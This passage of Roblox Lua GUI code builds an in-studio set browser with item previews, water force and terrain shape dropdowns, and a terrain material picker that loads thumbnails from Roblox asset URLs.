			local terrainShapes = {"Block","Vertical Ramp","Corner Wedge","Inverse Corner Wedge","Horizontal Ramp","Auto-Wedge"}
			local terrainShapeMap = {}
			for i = 1, #terrainShapes do
				terrainShapeMap[terrainShapes[i]] = i - 1
			end	
			terrainShapeMap[terrainShapes[#terrainShapes]] = 6
		
			local function createWaterGui()
				local waterForceDirections = {"NegX","X","NegY","Y","NegZ","Z"}
				local waterForces = {"None", "Small", "Medium", "Strong", "Max"}
		
				local waterFrame = Instance.new("Frame")
				waterFrame.Name = "WaterFrame"
				waterFrame.Style = Enum.FrameStyle.RobloxSquare
				waterFrame.Size = UDim2.new(0,150,0,110)
				waterFrame.Visible = false
		
				local waterForceLabel = Instance.new("TextLabel")
				waterForceLabel.Name = "WaterForceLabel"
				waterForceLabel.BackgroundTransparency = 1
				waterForceLabel.Size = UDim2.new(1,0,0,12)
				waterForceLabel.Font = Enum.Font.ArialBold
				waterForceLabel.FontSize = Enum.FontSize.Size12
				waterForceLabel.TextColor3 = Color3.new(1,1,1)
				waterForceLabel.TextXAlignment = Enum.TextXAlignment.Left
				waterForceLabel.Text = "Water Force"
				waterForceLabel.Parent = waterFrame
		
				local waterForceDirLabel = waterForceLabel:Clone()
				waterForceDirLabel.Name = "WaterForceDirectionLabel"
				waterForceDirLabel.Text = "Water Force Direction"
				waterForceDirLabel.Position = UDim2.new(0,0,0,50)
				waterForceDirLabel.Parent = waterFrame
		
				local waterTypeChangedEvent = Instance.new("BindableEvent",waterFrame)
				waterTypeChangedEvent.Name = "WaterTypeChangedEvent"
		
				local waterForceDirectionSelectedFunc = function(newForceDirection)
					waterForceDirection = newForceDirection
					waterTypeChangedEvent:Fire({waterForce, waterForceDirection})
				end
				local waterForceSelectedFunc = function(newForce)
					waterForce = newForce
					waterTypeChangedEvent:Fire({waterForce, waterForceDirection})
				end
		
				local waterForceDirectionDropDown, forceWaterDirectionSelection = t.CreateDropDownMenu(waterForceDirections, waterForceDirectionSelectedFunc)
				waterForceDirectionDropDown.Size = UDim2.new(1,0,0,25)
				waterForceDirectionDropDown.Position = UDim2.new(0,0,1,3)
				forceWaterDirectionSelection("NegX")
				waterForceDirectionDropDown.Parent = waterForceDirLabel
		
				local waterForceDropDown, forceWaterForceSelection = t.CreateDropDownMenu(waterForces, waterForceSelectedFunc)
				forceWaterForceSelection("None")
				waterForceDropDown.Size = UDim2.new(1,0,0,25)
				waterForceDropDown.Position = UDim2.new(0,0,1,3)
				waterForceDropDown.Parent = waterForceLabel
		
				return waterFrame, waterTypeChangedEvent
			end
		
			-- Helper Function that contructs gui elements
			local function createSetGui()
			
				local setGui = Instance.new("ScreenGui")
				setGui.Name = "SetGui"
				
				local setPanel = Instance.new("Frame")
				setPanel.Name = "SetPanel"
				setPanel.Active = true
				setPanel.BackgroundTransparency = 1
				if position then
					setPanel.Position = position
				else
					setPanel.Position = UDim2.new(0.2, 29, 0.1, 24)
				end
				if size then
					setPanel.Size = size
				else
					setPanel.Size = UDim2.new(0.6, -58, 0.64, 0)
				end
				setPanel.Style = Enum.FrameStyle.RobloxRound
				setPanel.ZIndex = 6
				setPanel.Parent = setGui
				
					-- Children of SetPanel
					local itemPreview = Instance.new("Frame")
					itemPreview.Name = "ItemPreview"
					itemPreview.BackgroundTransparency = 1
					itemPreview.Position = UDim2.new(0.8,5,0.085,0)
					itemPreview.Size = UDim2.new(0.21,0,0.9,0)
					itemPreview.ZIndex = 6
					itemPreview.Parent = setPanel
					
						-- Children of ItemPreview
						local textPanel = Instance.new("Frame")
						textPanel.Name = "TextPanel"
						textPanel.BackgroundTransparency = 1
						textPanel.Position = UDim2.new(0,0,0.45,0)
						textPanel.Size = UDim2.new(1,0,0.55,0)
						textPanel.ZIndex = 6
						textPanel.Parent = itemPreview
							
							-- Children of TextPanel
							local rolloverText = Instance.new("TextLabel")
							rolloverText.Name = "RolloverText"
							rolloverText.BackgroundTransparency = 1
							rolloverText.Size = UDim2.new(1,0,0,48)
							rolloverText.ZIndex = 6
							rolloverText.Font = Enum.Font.ArialBold
							rolloverText.FontSize = Enum.FontSize.Size24
							rolloverText.Text = ""
							rolloverText.TextColor3 = Color3.new(1,1,1)
							rolloverText.TextWrap = true
							rolloverText.TextXAlignment = Enum.TextXAlignment.Left
							rolloverText.TextYAlignment = Enum.TextYAlignment.Top
							rolloverText.Parent = textPanel
							
						local largePreview = Instance.new("ImageLabel")
						largePreview.Name = "LargePreview"
						largePreview.BackgroundTransparency = 1
						largePreview.Image = ""
						largePreview.Size = UDim2.new(1,0,0,170)
						largePreview.ZIndex = 6
						largePreview.Parent = itemPreview
						
					local sets = Instance.new("Frame")
					sets.Name = "Sets"
					sets.BackgroundTransparency = 1
					sets.Position = UDim2.new(0,0,0,5)
					sets.Size = UDim2.new(0.23,0,1,-5)
					sets.ZIndex = 6
					sets.Parent = setPanel
					
						-- Children of Sets
						local line = Instance.new("Frame")
						line.Name = "Line"
						line.BackgroundColor3 = Color3.new(1,1,1)
						line.BackgroundTransparency = 0.7
						line.BorderSizePixel = 0
						line.Position = UDim2.new(1,-3,0.06,0)
						line.Size = UDim2.new(0,3,0.9,0)
						line.ZIndex = 6
						line.Parent = sets
						
						local setsLists, controlFrame = t.CreateTrueScrollingFrame()
						setsLists.Size = UDim2.new(1,-6,0.94,0)
						setsLists.Position = UDim2.new(0,0,0.06,0)
						setsLists.BackgroundTransparency = 1
						setsLists.Name = "SetsLists"
						setsLists.ZIndex = 6
						setsLists.Parent = sets
						drillDownSetZIndex(controlFrame, 7)
							
						local setsHeader = Instance.new("TextLabel")
						setsHeader.Name = "SetsHeader"
						setsHeader.BackgroundTransparency = 1
						setsHeader.Size = UDim2.new(0,47,0,24)
						setsHeader.ZIndex = 6
						setsHeader.Font = Enum.Font.ArialBold
						setsHeader.FontSize = Enum.FontSize.Size24
						setsHeader.Text = "Sets"
						setsHeader.TextColor3 = Color3.new(1,1,1)
						setsHeader.TextXAlignment = Enum.TextXAlignment.Left
						setsHeader.TextYAlignment = Enum.TextYAlignment.Top
						setsHeader.Parent = sets
					
					local cancelButton = Instance.new("TextButton")
					cancelButton.Name = "CancelButton"
					cancelButton.Position = UDim2.new(1,-32,0,-2)
					cancelButton.Size = UDim2.new(0,34,0,34)
					cancelButton.Style = Enum.ButtonStyle.RobloxButtonDefault
					cancelButton.ZIndex = 6
					cancelButton.Text = ""
					cancelButton.Modal = true
					cancelButton.Parent = setPanel
					
						-- Children of Cancel Button
						local cancelImage = Instance.new("ImageLabel")
						cancelImage.Name = "CancelImage"
						cancelImage.BackgroundTransparency = 1
						cancelImage.Image = "https://www.roblox.com/asset/?id=54135717"
						cancelImage.Position = UDim2.new(0,-2,0,-2)
						cancelImage.Size = UDim2.new(0,16,0,16)
						cancelImage.ZIndex = 6
						cancelImage.Parent = cancelButton
							
				return setGui
			end
			
			local function createSetButton(text)
				local setButton = Instance.new("TextButton")
				
				if text then setButton.Text = text
				else setButton.Text = "" end
				
				setButton.AutoButtonColor = false
				setButton.BackgroundTransparency = 1
				setButton.BackgroundColor3 = Color3.new(1,1,1)
				setButton.BorderSizePixel = 0
				setButton.Size = UDim2.new(1,-5,0,18)
				setButton.ZIndex = 6
				setButton.Visible = false
				setButton.Font = Enum.Font.Arial
				setButton.FontSize = Enum.FontSize.Size18
				setButton.TextColor3 = Color3.new(1,1,1)
				setButton.TextXAlignment = Enum.TextXAlignment.Left
				
				return setButton
			end
			
			local function buildSetButton(name, setId, setImageId, i,  count)
				local button = createSetButton(name)
				button.Text = name
				button.Name = "SetButton"
				button.Visible = true
				
				local setValue = Instance.new("IntValue")
				setValue.Name = "SetId"
				setValue.Value = setId
				setValue.Parent = button
		
				local setName = Instance.new("StringValue")
				setName.Name = "SetName"
				setName.Value = name
				setName.Parent = button
		
				return button
			end
			
			local function processCategory(sets)
				local setButtons = {}
				local numSkipped = 0
				for i = 1, #sets do
					if not showAdminCategories and sets[i].Name == "Beta" then
						numSkipped = numSkipped + 1
					else
						setButtons[i - numSkipped] = buildSetButton(sets[i].Name, sets[i].CategoryId, sets[i].ImageAssetId, i - numSkipped, #sets)
					end
				end
				return setButtons
			end
			
			local function handleResize()
				wait() -- neccessary to insure heartbeat happened
				
				local itemPreview = setGui.SetPanel.ItemPreview
				
				itemPreview.LargePreview.Size = UDim2.new(1,0,0,itemPreview.AbsoluteSize.X)
				itemPreview.LargePreview.Position = UDim2.new(0.5,-itemPreview.LargePreview.AbsoluteSize.X/2,0,0)
				itemPreview.TextPanel.Position = UDim2.new(0,0,0,itemPreview.LargePreview.AbsoluteSize.Y)
				itemPreview.TextPanel.Size = UDim2.new(1,0,0,itemPreview.AbsoluteSize.Y - itemPreview.LargePreview.AbsoluteSize.Y)
			end
			
			local function makeInsertAssetButton()
				local insertAssetButtonExample = Instance.new("Frame")
				insertAssetButtonExample.Name = "InsertAssetButtonExample"
				insertAssetButtonExample.Position = UDim2.new(0,128,0,64)
				insertAssetButtonExample.Size = UDim2.new(0,64,0,64)
				insertAssetButtonExample.BackgroundTransparency = 1
				insertAssetButtonExample.ZIndex = 6
				insertAssetButtonExample.Visible = false
		
				local assetId = Instance.new("IntValue")
				assetId.Name = "AssetId"
				assetId.Value = 0
				assetId.Parent = insertAssetButtonExample
				
				local assetName = Instance.new("StringValue")
				assetName.Name = "AssetName"
				assetName.Value = ""
				assetName.Parent = insertAssetButtonExample
		
				local button = Instance.new("TextButton")
				button.Name = "Button"
				button.Text = ""
				button.Style = Enum.ButtonStyle.RobloxButton
				button.Position = UDim2.new(0.025,0,0.025,0)
				button.Size = UDim2.new(0.95,0,0.95,0)
				button.ZIndex = 6
				button.Parent = insertAssetButtonExample
		
				local buttonImage = Instance.new("ImageLabel")
				buttonImage.Name = "ButtonImage"
				buttonImage.Image = ""
				buttonImage.Position = UDim2.new(0,-7,0,-7)
				buttonImage.Size = UDim2.new(1,14,1,14)
				buttonImage.BackgroundTransparency = 1
				buttonImage.ZIndex = 7
				buttonImage.Parent = button
		
				local configIcon = buttonImage:clone()
				configIcon.Name = "ConfigIcon"
				configIcon.Visible = false
				configIcon.Position = UDim2.new(1,-23,1,-24)
				configIcon.Size = UDim2.new(0,16,0,16)
				configIcon.Image = ""
				configIcon.ZIndex = 6
				configIcon.Parent = insertAssetButtonExample
				
				return insertAssetButtonExample
			end
			
			local function showLargePreview(insertButton)
				if insertButton:FindFirstChild("AssetId") then
					delay(0,function()
						game:GetService("ContentProvider"):Preload(LargeThumbnailUrl .. tostring(insertButton.AssetId.Value))
						setGui.SetPanel.ItemPreview.LargePreview.Image = LargeThumbnailUrl .. tostring(insertButton.AssetId.Value)
					end)
				end
				if insertButton:FindFirstChild("AssetName") then
					setGui.SetPanel.ItemPreview.TextPanel.RolloverText.Text = insertButton.AssetName.Value
				end
			end
			
			local function selectTerrainShape(shape)
				if currTerrainDropDownFrame then
					objectSelected(tostring(currTerrainDropDownFrame.AssetName.Value), tonumber(currTerrainDropDownFrame.AssetId.Value), shape)
				end
			end
			
			local function createTerrainTypeButton(name, parent)
				local dropDownTextButton = Instance.new("TextButton")
				dropDownTextButton.Name = name .. "Button"
				dropDownTextButton.Font = Enum.Font.ArialBold
				dropDownTextButton.FontSize = Enum.FontSize.Size14
				dropDownTextButton.BorderSizePixel = 0
				dropDownTextButton.TextColor3 = Color3.new(1,1,1)
				dropDownTextButton.Text = name
				dropDownTextButton.TextXAlignment = Enum.TextXAlignment.Left
				dropDownTextButton.BackgroundTransparency = 1
				dropDownTextButton.ZIndex = parent.ZIndex + 1
				dropDownTextButton.Size = UDim2.new(0,parent.Size.X.Offset - 2,0,16)
				dropDownTextButton.Position = UDim2.new(0,1,0,0)
		
				dropDownTextButton.MouseEnter:connect(function()
					dropDownTextButton.BackgroundTransparency = 0
					dropDownTextButton.TextColor3 = Color3.new(0,0,0)
				end)
		
				dropDownTextButton.MouseLeave:connect(function()
					dropDownTextButton.BackgroundTransparency = 1
					dropDownTextButton.TextColor3 = Color3.new(1,1,1)
				end)
		
				dropDownTextButton.MouseButton1Click:connect(function()
					dropDownTextButton.BackgroundTransparency = 1
					dropDownTextButton.TextColor3 = Color3.new(1,1,1)
					if dropDownTextButton.Parent and dropDownTextButton.Parent:IsA("GuiObject") then
						dropDownTextButton.Parent.Visible = false
					end
					selectTerrainShape(terrainShapeMap[dropDownTextButton.Text])
				end)
		
				return dropDownTextButton
			end
			
			local function createTerrainDropDownMenu(zIndex)
				local dropDown = Instance.new("Frame")
				dropDown.Name = "TerrainDropDown"
				dropDown.BackgroundColor3 = Color3.new(0,0,0)
				dropDown.BorderColor3 = Color3.new(1,0,0)
				dropDown.Size = UDim2.new(0,200,0,0)
				dropDown.Visible = false
				dropDown.ZIndex = zIndex
				dropDown.Parent = setGui
		
				for i = 1, #terrainShapes do
					local shapeButton = createTerrainTypeButton(terrainShapes[i],dropDown)
					shapeButton.Position = UDim2.new(0,1,0,(i - 1) * (shapeButton.Size.Y.Offset))
					shapeButton.Parent = dropDown
					dropDown.Size = UDim2.new(0,200,0,dropDown.Size.Y.Offset + (shapeButton.Size.Y.Offset))
				end
		
				dropDown.MouseLeave:connect(function()
					dropDown.Visible = false
				end)
			end
		
			
			local function createDropDownMenuButton(parent)
				local dropDownButton = Instance.new("ImageButton")
				dropDownButton.Name = "DropDownButton"
				dropDownButton.Image = "https://www.roblox.com/asset/?id=67581509"
				dropDownButton.BackgroundTransparency = 1
				dropDownButton.Size = UDim2.new(0,16,0,16)
				dropDownButton.Position = UDim2.new(1,-24,0,6)
				dropDownButton.ZIndex = parent.ZIndex + 2
				dropDownButton.Parent = parent
				
				if not setGui:FindFirstChild("TerrainDropDown") then
					createTerrainDropDownMenu(8)
				end
				
				dropDownButton.MouseButton1Click:connect(function()
					setGui.TerrainDropDown.Visible = true
					setGui.TerrainDropDown.Position = UDim2.new(0,parent.AbsolutePosition.X,0,parent.AbsolutePosition.Y)
					currTerrainDropDownFrame = parent
				end)
			end
			
			local function buildInsertButton()
				local insertButton = makeInsertAssetButton()
				insertButton.Name = "InsertAssetButton"
				insertButton.Visible = true
		
				if Data.Category[Data.CurrentCategory].SetName == "High Scalability" then
					createDropDownMenuButton(insertButton)
				end
		
				local lastEnter = nil
				local mouseEnterCon = insertButton.MouseEnter:connect(function()
					lastEnter = insertButton
					delay(0.1,function()
						if lastEnter == insertButton then
							showLargePreview(insertButton)
						end
					end)
				end)
				return insertButton, mouseEnterCon
			end
			
			local function realignButtonGrid(columns)
				local x = 0
				local y = 0 
				for i = 1, #insertButtons do
					insertButtons[i].Position = UDim2.new(0, buttonWidth * x, 0, buttonHeight * y)
					x = x + 1
					if x >= columns then
						x = 0
						y = y + 1
					end
				end
			end
		
			local function setInsertButtonImageBehavior(insertFrame, visible, name, assetId)
				if visible then
					insertFrame.AssetName.Value = name
					insertFrame.AssetId.Value = assetId
					local newImageUrl = SmallThumbnailUrl  .. assetId
					if newImageUrl ~= insertFrame.Button.ButtonImage.Image then
						delay(0,function()
							game:GetService("ContentProvider"):Preload(SmallThumbnailUrl  .. assetId)
							if insertFrame:findFirstChild("Button") then
								insertFrame.Button.ButtonImage.Image = SmallThumbnailUrl  .. assetId
							end
						end)
					end
					table.insert(insertButtonCons,
						insertFrame.Button.MouseButton1Click:connect(function()
							-- special case for water, show water selection gui
							local isWaterSelected = (name == "Water") and (Data.Category[Data.CurrentCategory].SetName == "High Scalability")
							waterGui.Visible = isWaterSelected
							if isWaterSelected then
								objectSelected(name, tonumber(assetId), nil)
							else
								objectSelected(name, tonumber(assetId))
							end
						end)
					)
					insertFrame.Visible = true
				else
					insertFrame.Visible = false
				end
			end
			
			local function loadSectionOfItems(setGui, rows, columns)
				local pageSize = rows * columns
		
				if arrayPosition > #contents then return end
		
				local origArrayPos = arrayPosition
		
				local yCopy = 0
				for i = 1, pageSize + 1 do 
					if arrayPosition >= #contents + 1 then
						break
					end
		
					local buttonCon
					insertButtons[arrayPosition], buttonCon = buildInsertButton()
					table.insert(insertButtonCons,buttonCon)
					insertButtons[arrayPosition].Parent = setGui.SetPanel.ItemsFrame
					arrayPosition = arrayPosition + 1
				end
				realignButtonGrid(columns)
		
				local indexCopy = origArrayPos
				for index = origArrayPos, arrayPosition do
					if insertButtons[index] then
						if contents[index] then
		
							-- we don't want water to have a drop down button
							if contents[index].Name == "Water" then
								if Data.Category[Data.CurrentCategory].SetName == "High Scalability" then
									insertButtons[index]:FindFirstChild("DropDownButton",true):Destroy()
								end
							end
		
							local assetId
							if useAssetVersionId then
								assetId = contents[index].AssetVersionId
							else
								assetId = contents[index].AssetId
							end
							setInsertButtonImageBehavior(insertButtons[index], true, contents[index].Name, assetId)
						else
							break
						end
					else
						break
					end
					indexCopy = index
				end
			end
			
			local function setSetIndex()
				Data.Category[Data.CurrentCategory].Index = 0
		
				rows = 7
				columns = math.floor(setGui.SetPanel.ItemsFrame.AbsoluteSize.X/buttonWidth)
		
				contents = Data.Category[Data.CurrentCategory].Contents
				if contents then
					-- remove our buttons and their connections
					for i = 1, #insertButtons do
						insertButtons[i]:remove()
					end
					for i = 1, #insertButtonCons do
						if insertButtonCons[i] then insertButtonCons[i]:disconnect() end
					end
					insertButtonCons = {}
					insertButtons = {}
		
					arrayPosition = 1
					loadSectionOfItems(setGui, rows, columns)
				end
			end
			
			local function selectSet(button, setName, setId, setIndex)
				if button and Data.Category[Data.CurrentCategory] ~= nil then
					if button ~= Data.Category[Data.CurrentCategory].Button then
						Data.Category[Data.CurrentCategory].Button = button
		
						if SetCache[setId] == nil then
							SetCache[setId] = game:GetService("InsertService"):GetCollection(setId)
						end
						Data.Category[Data.CurrentCategory].Contents = SetCache[setId]
		
						Data.Category[Data.CurrentCategory].SetName = setName
						Data.Category[Data.CurrentCategory].SetId = setId
					end
					setSetIndex()
				end
			end
			
			local function selectCategoryPage(buttons, page)
				if buttons ~= Data.CurrentCategory then
					if Data.CurrentCategory then
						for key, button in pairs(Data.CurrentCategory) do
							button.Visible = false
						end
					end
		
					Data.CurrentCategory = buttons
					if Data.Category[Data.CurrentCategory] == nil then
						Data.Category[Data.CurrentCategory] = {}
						if #buttons > 0 then
							selectSet(buttons[1], buttons[1].SetName.Value, buttons[1].SetId.Value, 0)
						end
					else
						Data.Category[Data.CurrentCategory].Button = nil
						selectSet(Data.Category[Data.CurrentCategory].ButtonFrame, Data.Category[Data.CurrentCategory].SetName, Data.Category[Data.CurrentCategory].SetId, Data.Category[Data.CurrentCategory].Index)
					end
				end
			end
			
			local function selectCategory(category)
				selectCategoryPage(category, 0)
			end
			
			local function resetAllSetButtonSelection()
				local setButtons = setGui.SetPanel.Sets.SetsLists:GetChildren()
				for i = 1, #setButtons do
					if setButtons[i]:IsA("TextButton") then
						setButtons[i].Selected = false
						setButtons[i].BackgroundTransparency = 1
						setButtons[i].TextColor3 = Color3.new(1,1,1)
						setButtons[i].BackgroundColor3 = Color3.new(1,1,1)
					end
				end
			end
			
			local function populateSetsFrame()
				local currRow = 0
				for i = 1, #userCategoryButtons do
					local button = userCategoryButtons[i]
					button.Visible = true
					button.Position = UDim2.new(0,5,0,currRow * button.Size.Y.Offset)
					button.Parent = setGui.SetPanel.Sets.SetsLists
					
					if i == 1 then -- we will have this selected by default, so show it
						button.Selected = true
						button.BackgroundColor3 = Color3.new(0,204/255,0)
						button.TextColor3 = Color3.new(0,0,0)
						button.BackgroundTransparency = 0
					end
		
					button.MouseEnter:connect(function()
						if not button.Selected then
							button.BackgroundTransparency = 0
							button.TextColor3 = Color3.new(0,0,0)
						end
					end)
					button.MouseLeave:connect(function()
						if not button.Selected then
							button.BackgroundTransparency = 1
							button.TextColor3 = Color3.new(1,1,1)
						end
					end)
					button.MouseButton1Click:connect(function()
						resetAllSetButtonSelection()
						button.Selected = not button.Selected
						button.BackgroundColor3 = Color3.new(0,204/255,0)
						button.TextColor3 = Color3.new(0,0,0)
						button.BackgroundTransparency = 0
						selectSet(button, button.Text, userCategoryButtons[i].SetId.Value, 0)
					end)
		
					currRow = currRow + 1
				end
		
				local buttons =  setGui.SetPanel.Sets.SetsLists:GetChildren()
		
				-- set first category as loaded for default
				if buttons then
					for i = 1, #buttons do
						if buttons[i]:IsA("TextButton") then
							selectSet(buttons[i], buttons[i].Text, userCategoryButtons[i].SetId.Value, 0)
							selectCategory(userCategoryButtons)
							break
						end
					end
				end
			end
		
			setGui = createSetGui()
			waterGui, waterTypeChangedEvent = createWaterGui()
			waterGui.Position = UDim2.new(0,55,0,0)
			waterGui.Parent = setGui
			setGui.Changed:connect(function(prop) -- this resizes the preview image to always be the right size
				if prop == "AbsoluteSize" then
					handleResize()
					setSetIndex()
				end
			end)
			
			local scrollFrame, controlFrame = t.CreateTrueScrollingFrame()
			scrollFrame.Size = UDim2.new(0.54,0,0.85,0)
			scrollFrame.Position = UDim2.new(0.24,0,0.085,0)
			scrollFrame.Name = "ItemsFrame"
			scrollFrame.ZIndex = 6
			scrollFrame.Parent = setGui.SetPanel
			scrollFrame.BackgroundTransparency = 1
		
			drillDownSetZIndex(controlFrame,7)
		
			controlFrame.Parent = setGui.SetPanel
			controlFrame.Position = UDim2.new(0.76, 5, 0, 0)
		
			local debounce = false
			controlFrame.ScrollBottom.Changed:connect(function(prop)
				if controlFrame.ScrollBottom.Value == true then
					if debounce then return end
					debounce = true
						loadSectionOfItems(setGui, rows, columns)
					debounce = false
				end
			end)
		
			local userData = {}
			for id = 1, #userIdsForSets do
				local newUserData = game:GetService("InsertService"):GetUserSets(userIdsForSets[id])
				if newUserData and #newUserData > 2 then
					-- start at #3 to skip over My Decals and My Models for each account
					for category = 3, #newUserData do
						if newUserData[category].Name == "High Scalability" then -- we want high scalability parts to show first
							table.insert(userData,1,newUserData[category])
						else
							table.insert(userData, newUserData[category])
						end
					end
				end
			
			end
			if userData then
				userCategoryButtons = processCategory(userData)
			end
		
			rows = math.floor(setGui.SetPanel.ItemsFrame.AbsoluteSize.Y/buttonHeight)
			columns = math.floor(setGui.SetPanel.ItemsFrame.AbsoluteSize.X/buttonWidth)
		
			populateSetsFrame()
		
			setGui.SetPanel.CancelButton.MouseButton1Click:connect(function()
				setGui.SetPanel.Visible = false
				if dialogClosed then dialogClosed() end
			end)
			
			local setVisibilityFunction = function(visible)
				if visible then
					setGui.SetPanel.Visible = true
				else
					setGui.SetPanel.Visible = false
				end
			end
			
			local getVisibilityFunction = function()
				if setGui then
					if setGui:FindFirstChild("SetPanel") then
						return setGui.SetPanel.Visible
					end
				end
				
				return false
			end
			
			return setGui, setVisibilityFunction, getVisibilityFunction, waterTypeChangedEvent
		end
		
		t.CreateTerrainMaterialSelector = function(size,position)
			local terrainMaterialSelectionChanged = Instance.new("BindableEvent")
			terrainMaterialSelectionChanged.Name = "TerrainMaterialSelectionChanged"
		
			local selectedButton = nil
		
			local frame = Instance.new("Frame")
			frame.Name = "TerrainMaterialSelector"
			if size then
				frame.Size = size
			else
				frame.Size = UDim2.new(0, 245, 0, 230)
			end
			if position then
				frame.Position = position
			end
			frame.BorderSizePixel = 0
			frame.BackgroundColor3 = Color3.new(0,0,0)
			frame.Active = true
		
			terrainMaterialSelectionChanged.Parent = frame
		
			local waterEnabled = true -- todo: turn this on when water is ready
		
			local materialToImageMap = {}
			local materialNames = {"Grass", "Sand", "Brick", "Granite", "Asphalt", "Iron", "Aluminum", "Gold", "Plank", "Log", "Gravel", "Cinder Block", "Stone Wall", "Concrete", "Plastic (red)", "Plastic (blue)"}
			if waterEnabled then
				table.insert(materialNames,"Water")
			end
			local currentMaterial = 1
		
			function getEnumFromName(choice)
				if choice == "Grass" then return 1 end
				if choice == "Sand" then return 2 end 
				if choice == "Erase" then return 0 end
				if choice == "Brick" then return 3 end
				if choice == "Granite" then return 4 end
				if choice == "Asphalt" then return 5 end
				if choice == "Iron" then return 6 end
				if choice == "Aluminum" then return 7 end
				if choice == "Gold" then return 8 end
				if choice == "Plank" then return 9 end
				if choice == "Log" then return 10 end
				if choice == "Gravel" then return 11 end
				if choice == "Cinder Block" then return 12 end
				if choice == "Stone Wall" then return 13 end
				if choice == "Concrete" then return 14 end
				if choice == "Plastic (red)" then return 15 end
				if choice == "Plastic (blue)" then return 16 end
				if choice == "Water" then return 17 end
			end
		
			function getNameFromEnum(choice)
				if choice == Enum.CellMaterial.Grass or choice == 1 then return "Grass"end
				if choice == Enum.CellMaterial.Sand or choice == 2 then return "Sand" end 
				if choice == Enum.CellMaterial.Empty or choice == 0 then return "Erase" end
				if choice == Enum.CellMaterial.Brick or choice == 3 then return "Brick" end
				if choice == Enum.CellMaterial.Granite or choice == 4 then return "Granite" end
				if choice == Enum.CellMaterial.Asphalt or choice == 5 then return "Asphalt" end
				if choice == Enum.CellMaterial.Iron or choice == 6 then return "Iron" end
				if choice == Enum.CellMaterial.Aluminum or choice == 7 then return "Aluminum" end
				if choice == Enum.CellMaterial.Gold or choice == 8 then return "Gold" end
				if choice == Enum.CellMaterial.WoodPlank or choice == 9 then return "Plank" end
				if choice == Enum.CellMaterial.WoodLog or choice == 10 then return "Log" end
				if choice == Enum.CellMaterial.Gravel or choice == 11 then return "Gravel" end
				if choice == Enum.CellMaterial.CinderBlock or choice == 12 then return "Cinder Block" end
				if choice == Enum.CellMaterial.MossyStone or choice == 13 then return "Stone Wall" end
				if choice == Enum.CellMaterial.Cement or choice == 14 then return "Concrete" end
				if choice == Enum.CellMaterial.RedPlastic or choice == 15 then return "Plastic (red)" end
				if choice == Enum.CellMaterial.BluePlastic or choice == 16 then return "Plastic (blue)" end
		
				if waterEnabled then
					if choice == Enum.CellMaterial.Water or choice == 17 then return "Water" end
				end
			end
		
		
			local function updateMaterialChoice(choice)
				currentMaterial = getEnumFromName(choice)
				terrainMaterialSelectionChanged:Fire(currentMaterial)
			end
		
			-- we so need a better way to do this
			for i,v in pairs(materialNames) do
				materialToImageMap[v] = {}
				if v == "Grass" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=56563112"
				elseif v == "Sand" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=62356652"
				elseif v == "Brick" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=65961537"
				elseif v == "Granite" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532153"
				elseif v == "Asphalt" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532038"
				elseif v == "Iron" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532093"
				elseif v == "Aluminum" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531995"
				elseif v == "Gold" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532118"
				elseif v == "Plastic (red)" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531848"
				elseif v == "Plastic (blue)" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531924"
				elseif v == "Plank" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532015"
				elseif v == "Log" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532051"
				elseif v == "Gravel" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532206"
				elseif v == "Cinder Block" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532103"
				elseif v == "Stone Wall" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531804"
				elseif v == "Concrete" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532059"
				elseif v == "Water" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=81407474"
				else materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=66887593" -- fill in the rest here!!
				end
			end
		
			local scrollFrame, scrollUp, scrollDown, recalculateScroll = t.CreateScrollingFrame(nil,"grid")
			scrollFrame.Size = UDim2.new(0.85,0,1,0)
			scrollFrame.Position = UDim2.new(0,0,0,0)
			scrollFrame.Parent = frame
		
			scrollUp.Parent = frame
			scrollUp.Visible = true
			scrollUp.Position = UDim2.new(1,-19,0,0)
		
			scrollDown.Parent = frame
			scrollDown.Visible = true
			scrollDown.Position = UDim2.new(1,-19,1,-17)
		
			local function goToNewMaterial(buttonWrap, materialName)
				updateMaterialChoice(materialName)
				buttonWrap.BackgroundTransparency = 0
				selectedButton.BackgroundTransparency = 1
				selectedButton = buttonWrap
			end
		
			local function createMaterialButton(name)	
				local buttonWrap = Instance.new("TextButton")
				buttonWrap.Text = ""
				buttonWrap.Size = UDim2.new(0,32,0,32)
				buttonWrap.BackgroundColor3 = Color3.new(1,1,1)
				buttonWrap.BorderSizePixel = 0
				buttonWrap.BackgroundTransparency = 1
				buttonWrap.AutoButtonColor = false
				buttonWrap.Name = tostring(name)
				
				local imageButton = Instance.new("ImageButton")
				imageButton.AutoButtonColor = false
				imageButton.BackgroundTransparency = 1
				imageButton.Size = UDim2.new(0,30,0,30)
				imageButton.Position = UDim2.new(0,1,0,1)
				imageButton.Name = tostring(name)
				imageButton.Parent = buttonWrap
				imageButton.Image = materialToImageMap[name].Regular
		
				local enumType = Instance.new("NumberValue")
				enumType.Name = "EnumType"
				enumType.Parent = buttonWrap
				enumType.Value = 0
				
				imageButton.MouseEnter:connect(function()
					buttonWrap.BackgroundTransparency = 0
				end)
				imageButton.MouseLeave:connect(function()
					if selectedButton ~= buttonWrap then
						buttonWrap.BackgroundTransparency = 1
					end
				end)
				imageButton.MouseButton1Click:connect(function()
					if selectedButton ~= buttonWrap then
						goToNewMaterial(buttonWrap, tostring(name))
					end
				end)
				
				return buttonWrap 
			end
		
			for i = 1, #materialNames do
				local imageButton = createMaterialButton(materialNames[i])
				
				if materialNames[i] == "Grass" then -- always start with grass as the default
					selectedButton = imageButton
					imageButton.BackgroundTransparency = 0
				end
				
				imageButton.Parent = scrollFrame
			end
		
